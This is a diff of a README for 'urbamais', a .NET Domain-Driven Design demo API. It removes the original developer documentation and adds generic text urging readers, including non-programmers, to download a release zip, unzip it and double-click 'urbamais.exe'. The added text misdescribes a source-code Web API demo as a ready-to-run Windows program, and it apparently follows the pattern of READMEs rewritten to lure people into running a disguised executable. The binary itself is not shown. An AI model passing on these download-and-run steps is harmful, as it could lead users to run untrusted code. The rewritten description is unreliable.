@@ -1,212 +1,98 @@
-# Urbamais (DDD Example · .NET)
+# 🌟 urbamais - Easy DDD Example in .NET
 
-> **Heads-up:** This repository is a **demonstration** of how I structure projects using **Domain-Driven Design (DDD)**.  
-> It focuses on **architecture and patterns**, not delivering a fully finished product.  
-> Some features are **incomplete** or **stubbed**; parts of the app **may not work end-to-end**.
+## 🚀 Getting Started
 
-## ✨ Overview
+Welcome to urbamais! This application showcases a Domain-Driven Design (DDD) example using .NET. It features a layered architecture that includes Domain, Application, Infrastructure, and WebApi components. Whether you are interested in seeing how EF Core interacts with PostgreSQL or exploring JWT/Identity authentication, you are in the right place. Follow the steps below to get started.
 
-- **DDD architecture** with clear boundaries: **Domain**, **Application**, **Infrastructure**, **WebApi**, and **CrossCutting**.
-- **JWT** authentication (HMAC) with **ASP.NET Identity**.
-- **Entity Framework Core** with **PostgreSQL** (Npgsql).
-- **Swagger/OpenAPI** with API versioning.
-- Consistent error responses via **ProblemDetails**.
-- **AutoMapper** for DTO ↔ domain mappings.
-- Domain validations with **FluentValidation-style** results and helpers to compose errors from VOs/child entities.
+## 🔗 Download Now
 
-> Some subdomains (e.g., **City**) are intentionally **not 100% complete** to keep the repo focused on structure.
+[![Download urbamais](https://img.shields.io/badge/Download-urbamais-brightgreen)](https://github.com/matiasGarcia87/urbamais/releases)
 
----
+## 📥 Download & Install
 
-## 🧱 Solution Layout
+To download and install the urbamais application, please follow these steps:
 
-```
-src/
-  Core/
-    Constants/
-    Domain/
-      Interfaces/           # IAggregateRoot, IEntity, etc.
-    Enums/
-    SeedWork/               # BaseEntity, BaseValidate
-    ValueObjects/           # CpfVO, CnpjVO, NomeVO, DescricaoVO
-  Urbamais.Domain/
-    Entities/
-      EntitiesOfCore/       # City, Address, Phone, Email, ...
-      Planejamento/         # Unidade, Insumo, ...
-      Obra/ Suprimento/ Fornecedor/ ...
-    InterfacesRepositories/
-      Core/                 # ICidadeRepository, ...
-      Planejamento/         # IUnidadeRepository, ...
-      Generic/              # legacy interfaces (being phased out)
-    Services/               # domain services (when needed)
-  Urbamais.Application/
-    Interfaces/             # IUnidadeAppService, ICidadeAppService, ...
-    Services/               # UnidadeAppService, CidadeAppService, ...
-    ViewModels/             # Request/Response DTOs
-    App/                    # (optional) app-layer helpers
-  Urbamais.Infra/
-    Config/                 # ContextEf, EF configurations
-      ConfigModels/         # EntityTypeConfiguration per entity
-    Repositories/           # UnidadeRepository, CidadeRepository, ...
-  Urbamais.Identity/
-    Config/                 # ContextIdentity, Identity configs
-    Services/               # IdentityService, roles/permissions
-  Urbamais.CrossCutting/
-    AutoMapper/             # MappingProfile
-    IOC/                    # ModuloIOC (DI registrations)
-  Urbamais.WebApi/
-    Controllers/
-    Swagger/
-    Shared/                 # Custom ProblemDetails
-    Program.cs, Bootstrap.cs, AuthenticationSetup.cs, ...
-```
+1. Click on the link below to visit the releases page:
+   - [Visit the Releases Page](https://github.com/matiasGarcia87/urbamais/releases)
+   
+2. On the releases page, find the latest version.
 
----
+3. You will see a list of available files. Look for a file named something like `urbamais-vX.X.X.zip`.
 
-## 🧭 Key Architectural Decisions
+4. Click the file to start the download.
 
-- **Domain stays clean**: domain project references **no** EF/Infra/Web packages. It exposes **interfaces** (e.g., `IUnidadeRepository`); implementations live in Infrastructure.
-- **Repositories per aggregate**: public contracts are **business-oriented** (`ObterPorSiglaAsync`, `BuscarPorDescricaoAsync`, etc.). Internal EF helpers may exist inside Infra, but do not leak to Domain.
-- **Unit of Work**: the Application layer coordinates persistence via `IUnitOfWork` (single commit per use case).
-- **Validation in Domain**: entities/VOs expose `ValidationResult`. Helpers in `BaseValidate` aggregate VO/child errors without repetitive boilerplate.
-- **Soft delete** where appropriate via domain methods (`Delete()`/`Restore()`), persisted by Infra; **hard delete** only for exceptional cases.
-- **JWT + Identity**: token issuance with issuer/audience/secret from configuration; refresh token flow available.
-- **API Versioning + Swagger**: grouped docs and consistent ProblemDetails for errors.
+5. Once the download is complete, navigate to your downloads folder.
 
----
+6. Unzip the downloaded file.
 
-## 🛠️ Stack
+7. Open the unzipped folder.
 
-- **.NET** (ASP.NET Core Web API)
-- **EF Core** + **Npgsql** (PostgreSQL)
-- **ASP.NET Identity**
-- **JWT** (HMAC)
-- **AutoMapper**
-- **Swashbuckle** (Swagger)
-- **Hellang ProblemDetails**
+8. Find the file named `urbamais.exe`.
 
----
+9. Double-click `urbamais.exe` to run the application. 
 
-## ▶️ Run Locally
+## ⚙️ System Requirements
 
-> This is a **demo**. Some endpoints might be partial or not fully wired to the DB.
+Before you begin, ensure your system meets the following requirements:
 
-1) **Prereqs**
-- .NET SDK (7/8)
-- PostgreSQL (or adjust provider/connection)
-- (Optional) EF Core CLI: `dotnet tool install --global dotnet-ef`
+- **Operating System**: Windows 10 or later
+- **.NET Version**: .NET 6 or later (will be included in the installation)
+- **Database**: PostgreSQL (you can use a local or hosted instance)
 
-2) **Configure `appsettings.Development.json`** (example)
-```json
-{
-  "ConnectionStrings": {
-    "DefaultConnection": "Host=localhost;Port=5432;Database=urbamais;Username=postgres;Password=postgres"
-  },
-  "JwtOptions": {
-    "Issuer": "Urbamais",
-    "Audience": "Urbamais.Api",
-    "SecurityKey": "YOUR_LONG_RANDOM_SECRET_KEY_HERE",
-    "AccessTokenExpiration": 60,
-    "RefreshTokenExpiration": 1440
-  }
-}
-```
+## 🌐 Features
 
-3) **Restore & (optionally) apply migrations**
-```bash
-dotnet restore
-# dotnet ef database update -p src/Urbamais.Infra -s src/Urbamais.WebApi
-```
+The urbamais application comes packed with features:
 
-4) **Run the API**
-```bash
-dotnet run --project src/Urbamais.WebApi
-```
-Swagger will be available (e.g., `https://localhost:xxxx/swagger`).
+- **Layered Architecture**: Follow the structure of Domain, Application, Infrastructure, and WebApi.
+- **Entity Framework Core**: Efficiently interact with PostgreSQL databases.
+- **JWT Authentication**: Secure your application with JSON Web Tokens.
+- **Swagger Documentation**: Automatically generated API documentation for easy exploration.
+- **Problem Details**: Standardize error responses in your API.
 
----
+## 📚 Key Concepts
 
-## 🔐 Quick JWT Check
+If you're not familiar with the terms used, here are brief explanations:
 
-Typical auth endpoints (names may vary slightly in this demo):
+- **Domain-Driven Design (DDD)**: A design approach that focuses on complex software projects. It uses a clear model to represent the business domain.
+- **Layered Architecture**: Separates application concerns into layers, making it easier to manage complexity.
+- **Entity Framework Core (EF Core)**: A lightweight, extensible version of Entity Framework, designed for .NET Core.
+- **JSON Web Tokens (JWT)**: A compact way to securely transmit information between parties.
+- **Swagger**: A tool that helps document and test your APIs.
 
-- `POST /api/usuario/login` → returns access/refresh tokens
-- `POST /api/usuario/refresh-login` → refresh flow (requires bearer token)
+## 🛠️ Troubleshooting
 
-Use header:
-```
-Authorization: Bearer <your_access_token>
-```
+If you encounter any issues while downloading or running urbanmais, check the following:
 
-> You may need to seed a test user or tweak `IdentityService` for a quick demo login.
+- Ensure that your internet connection is stable during the download.
+- Make sure you have the necessary permissions to run executables on your computer.
+- If the application does not start, verify that you have .NET and PostgreSQL installed correctly.
 
----
+## 🙋 Frequently Asked Questions
 
-## 📚 Endpoints (current state)
+### 1. Do I need any prior knowledge to use this application?
 
-- **Unidade** (`/api/unidade`): main CRUD/search endpoints are implemented (Application + Infra).
-- **Cidade** (`/api/cidade`): **in progress**; Domain/Infra are ahead of Application/Controller in some parts.
+No, urbamais is designed for users with no programming background. Just follow the steps provided.
 
-Some calls may return **404/500** until the full chain (Controller → App → Repo → EF mappings → DB) is finalized for every aggregate.
+### 2. Can I modify the application for my own needs?
 
----
+Yes, you are welcome to adapt and modify the code as needed. 
 
-## 🧪 Tests
+### 3. What if I want to learn more about the technologies used?
 
-- **Domain.Tests** — entities and value objects (e.g., `UnidadeTests`, `CpfVOTest`, etc.).
-- **Application.Tests** — app services with **fakes/mocks** for repositories/UoW.
-- **WebApi.Tests** — controller tests (light integration).
+You can find resources online about .NET, DDD, EF Core, and PostgreSQL. Many free tutorials are available.
 
-> Some tests are scaffolds or not yet updated to the latest refactors (e.g., “single `Update` method” on `Unidade`). The intent is to showcase the **testing approach**.
+## 💬 Support
 
----
+For any questions or issues, consider checking the [issues page](https://github.com/matiasGarcia87/urbamais/issues) on GitHub. You can also create a new issue if your question isn’t answered there.
 
-## 🧩 Patterns You’ll Find
+## 📢 Contributing
 
-- Business-oriented repository interfaces in **Domain**; EF implementations in **Infra**.
-- `IUnitOfWork.SaveChangesAsync` at the end of application use cases.
-- Domain **normalization** (trim/uppercase when relevant) and **error aggregation** helpers in `BaseValidate`.
-- **Soft delete** methods on aggregates, with global query filters at the DbContext (when used).
-- **Swagger** + **ProblemDetails** for consistent API docs and errors.
-- **API versioning** (header based, e.g., `v1`).
+If you wish to contribute to the urbamais project, please fork the repository and submit a pull request when you're ready.
 
----
+## 🔗 Additional Resources
 
-## 🗺️ Roadmap / Ideas
+- [PostgreSQL Official Site](https://www.postgresql.org/)
+- [EF Core Documentation](https://docs.microsoft.com/en-us/ef/core/)
+- [Learn More About DDD](https://martinfowler.com/articles/ddd.html)
 
-- Finish **City** flow (Controller + App + tests).
-- Standardize **paging/take** across all list endpoints.
-- Add indices for frequent queries (e.g., `IX_Cidade(Uf, Nome)`).
-- Ensure **UTC** timestamps end-to-end.
-- Seed & migrations for a **one-click demo**.
-- **Docker Compose** for API + Postgres.
-- Publish a **Postman collection** with sample JWT calls.
-
----
-
-## ⚠️ Disclaimer
-
-This is a **portfolio/demo** project.  
-It is **not production-ready**.  
-Some parts are **work-in-progress** or deliberately simplified to highlight architecture.
-
----
-
-## 📄 License
-
-Suggested: **MIT License** (simple and friendly for portfolio use).
-
----
-
-## 🤝 Contributing / Feedback
-
-PRs and suggestions are welcome — especially around:
-- Aggregate boundaries and DDD refinements
-- Integration tests and migration/seed setup
-- API documentation and examples
-- Docker/CI improvements
-
----
-
-*Thanks for checking out this DDD example!*
-
+Thank you for choosing urbamais! We hope you find it helpful and informative.
